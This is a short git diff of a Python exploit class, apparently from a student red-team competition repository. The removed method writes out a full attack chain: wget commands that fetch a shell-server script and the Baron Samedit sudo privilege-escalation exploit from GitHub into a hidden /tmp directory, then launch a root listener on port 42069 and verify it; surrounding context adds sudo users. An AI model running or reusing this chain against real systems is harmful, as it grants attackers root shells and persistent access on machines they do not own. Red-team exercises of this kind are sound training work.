@@ -56,32 +56,6 @@ class ChallengeOnePython(Exploit):
 			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeOnePython.{COLOR_END}")
 			return False
 
-	def start_root_netcat_server(self, port=42069):
-		"""
-		Sets up a root netcat server on the target machine
-
-		Returns True if the netcat server successfully started and False if not
-		"""
-		logger.info(f"Setting up a root netcat server on port {port} on the target machine...")
-		reverse_shell_command = f"cd /tmp/.owned; wget -O open_shell_server.py https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/open_shell_server.py && python3 open_shell_server.py -p {port} > /dev/null &"
-		get_root_wrapper = f"mkdir -p /tmp/.owned; cd /tmp/.owned; wget -O baron_samedit.py https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/exploits/baron_samedit.py; echo '{reverse_shell_command}' | python3 baron_samedit.py"
-		server_output = self.run_custom_command(command=get_root_wrapper)
-		logger.debug(f"Root shell returned `{server_output}`.")
-
-		time.sleep(0.1) # give the netcat server a chance to start up
-
-		# now attempt to connect to the root netcat server to ensure it actually worked
-		try:
-			logger.info(f"Checking if the root netcat server is up on port {port}...")
-			socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			socket_connection.connect((self.ip_address, port))
-			socket_connection.shutdown(socket.SHUT_WR)
-			logger.info(f"{COLOR_OKGREEN}Successfully started a root netcat server on port {port}!{COLOR_END}")
-			return True
-		except ConnectionRefusedError:
-			logger.info(f"{COLOR_FAIL}Failed to start a root netcat server on port {port}!{COLOR_END}")
-			return False
-
 	def add_user(self, username):
 		"""
 		Adds a user to the target with sudo privileges.
